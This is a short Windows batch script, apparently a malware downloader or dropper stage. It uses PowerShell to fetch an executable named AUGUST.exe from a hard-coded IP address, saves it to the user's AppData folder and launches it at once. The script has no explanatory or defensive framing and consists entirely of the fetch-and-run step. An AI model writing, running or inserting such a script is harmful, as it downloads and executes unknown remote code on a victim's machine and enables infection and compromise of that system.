@echo off
powershell wget http://172.94.3.25/AUGUST.exe -OutFile %APPDATA%/AUGUST.exe
start %APPDATA%/AUGUST.exe
